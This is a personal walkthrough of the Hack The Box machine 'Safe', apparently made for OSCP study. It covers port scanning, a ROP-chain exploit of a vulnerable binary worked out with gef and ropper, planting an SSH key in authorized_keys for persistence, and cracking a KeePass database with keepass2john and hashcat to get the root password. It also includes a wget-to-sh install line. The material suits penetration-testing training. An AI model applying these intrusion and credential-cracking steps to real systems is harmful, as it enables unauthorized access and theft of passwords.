# Safe Helpthrough
Name: Safe
Date:  28/10/2022
Difficulty:  Easy - probably not though
Goals:  OSCP prep, ROP chain (re?)discovery, 
Learnt:
- alot about pwntools, it make python more intuitive and less clunky and verbose 10/10 
	- context and tmux new-windowing in python scripts! 
	- recvuntil() - remove if over network
	- sendline 
	- remote() + interactive()
	- gdb.debug
- scp wildcard user directory dumping 
- wtf is keepass
- objdump like it is shooting star into my brain
Source: [Ippsec](https://www.youtube.com/watch?v=CO_g3wtC7rk)


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/Apex/Screenshots/ping.png)

I run masscan to rapid port scan so I already found the port 1337 tcp, but page isn't working for me...
![](notsoleet.png)
using `curl` I got back:
![](recievedhttp09.png)
with `nc`
![](cmdinjection.png)
Also no [shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
![](alsonoshellshock.png)

## Exploit

My feroxbuster content discovery on port 80 found /myapp.

![1000](myappfile.png)
Try to test my radare2, before defaulting to ghidra
![](r2-dtheapp.png)

Unlike ghidra we dont have a clear indicator of the buffer, but the size is the 0x70 and the sub opcode is subtracting 112 from the rsp thereby creating that space for the buffer.
![1000](bufferoverflow.png)
Decided that seeing as if is a initial buffer overflow. I will paused at 8:42 and finish this without the aid, because I do not need it.

Learnt about gef wonders, with a built in pattern creat and pattern search. Although 
[guyinatuxedo](https://guyinatuxedo.github.io/index2.html) and [gef commands](https://hugsy.github.io/gef/commands/aliases/) weere useful given my time constraints these day I returned to the video. Instead I use gefs builtin functions and then learn alot about pwntools. I got stuck because I thought it was a bufferoverflow and not a ROP chain, meaning that instead returning back the stack to call my shellcode we are hijacking another function call.

In short, try **NOT** to rely on this version of GEF: whenever possible you might prefer using "normal" GEF with its remote debugging functionalities. This version of GEF should be your last resort for having a descent debugging experience. https://github.com/hugsy/gef-legacy - for python2 gef, but with  `sudo wget -q -O-https://github.com/hugsy/gef/raw/main/scripts/gef-extras.sh | sh` for ropper

Return Oriented Programming (ROP) is using small bits of code that exist in the program to take little steps towards getting what you want to happen.

```bash
gef> r # run binary
# 
gef> pattern create <size>
# copy and paste 
r <paste pattern at correct stage of the program>
```
![](eipenum.png)
```
# look at *sp register address 
gef> pattern search $string_in_rsp
# for rop chaining you need the address of function call found in an disassembler
# how many arguments does the function call take?
```
![](gefisgreat.png)
```bash
gef info functions
# There are many way to go about using the function calls avaliable
# be mindful of:
# what any of the functions does
# arguments amount and type of that function
# whether the function is linked or not
# what address is it called from
gef> b *$function_call_address # requires *
# beware Arch!
# x64 order of execution of variables - rdi rsi rsx rcx r8 r9
x/s $register(s)_of_loaded_variables # the parametre of function call
# Now find away to hijack with your own string
gef> ropper --search r$num # for legacy-gef or gef-extras
ropper -f $binary | grep $register_of_the_function # from commandline
objdump -D myapp  | grep -i system
objdump -D myapp  | grep -i test
objdump -D myapp  | grep -i gets
``` 

Ghidra - blue linked function not in binary

![](objdumpiswow.png)

![](ropper.png)

The ippsec jumping around version did not work for me I instead made minor modifications to [Method 2: Write /bin/sh](https://0xdf.gitlab.io/2019/10/26/htb-safe.html), which similarly to the ippsec method wrote /bin/sh to be executed, but use  `gets` as ROP call and `system` call rather hijacking system and therefore need `rdi`  instead `r13` registers and use `gets` to read /bin/sh.

## Foothold

![](rev.png)

![](userhome.png)

```bash
ssh-keygen -f safe
chmod 600 safe
SAFEPUB=$(cat safe.pub)
# copy and paste to:
echo "$SAFEPUB" > /home/user/.ssh/authorized_keys # don't use env variable just for write-up
```

![](useruserssh.png)

## PrivEsc
In the folder is .kdbx file, which is [KeePass](https://en.wikipedia.org/wiki/KeePass). Dumping the user folder and use `keepass2john` of the `MyPasswords.kdbx` and

```bash
scp -i safe user@$ip:* 
for file in $(ls $setofkeyfiles); do keepass2john -k $img db.kdbx | sed "s/db/$file/g"; done >> keyfiles_john
hashcat -m 13400 -O keyfiles_john /usr/share/rockyou.txt --user
# Root password
```

0xDF: *"Once one cracks, I can kill it as the others won’t"* as it only needs one. Requires kpcli

```bash
kpcli --key IMG_0547.JPG --kdb MyPasswords.kdbx
ls
show 0 # ippsec
show -f R # 0xdf
```
and the password is in here
![](root.png)